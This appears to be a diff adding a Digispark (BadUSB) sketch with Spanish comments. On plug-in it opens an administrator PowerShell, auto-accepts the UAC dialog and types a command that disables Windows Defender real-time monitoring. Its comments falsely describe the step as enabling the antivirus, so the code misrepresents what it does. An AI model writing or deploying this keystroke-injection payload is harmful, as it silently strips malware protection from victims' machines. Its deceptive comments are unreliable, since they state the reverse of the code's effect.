@@ -1,0 +1,46 @@
+#include "DigiKeyboard.h"
+
+void setup() {
+// No es necesario inicializar nada aquí
+}
+
+void loop() {
+// Espera 2 segundos para que el sistema operativo reconozca el Digispark
+DigiKeyboard.delay(2000);
+
+// 1. Presiona la tecla Windows para abrir el menú Inicio
+DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT);
+DigiKeyboard.delay(500);
+
+// 2. Escribe "powershell" para buscarlo
+DigiKeyboard.print("powershell");
+DigiKeyboard.delay(700);
+
+// 3. Presiona Ctrl + Shift + Enter
+// Esto solicita ejecutar la aplicación como Administrador
+DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT | MOD_SHIFT_LEFT);
+DigiKeyboard.delay(2000); // Espera a que aparezca el diálogo UAC
+
+// 4. Acepta el diálogo UAC (Control de Cuentas de Usuario)
+// Presiona "Alt + S" (para "Sí" en Windows en Español)
+// NOTA: Si tu Windows está en Inglés, usa KEY_Y (para "Yes")
+DigiKeyboard.sendKeyStroke(KEY_S, MOD_ALT_LEFT);
+DigiKeyboard.delay(2500); // Espera a que la ventana de PowerShell se abra
+
+// 5. Escribe el comando para activar el antivirus
+// Set-MpPreference asegura que el monitoreo en tiempo real esté HABILITADO
+DigiKeyboard.print("Set-MpPreference -DisableRealtimeMonitoring $true");
+
+// 6. Presiona Enter para ejecutar el comando
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.delay(500);
+
+// 7. (Opcional) Cierra la ventana de PowerShell
+DigiKeyboard.print("exit");
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+
+// Bucle infinito para que el script no se repita
+while (true) {
+// No hacer nada
+}
+}
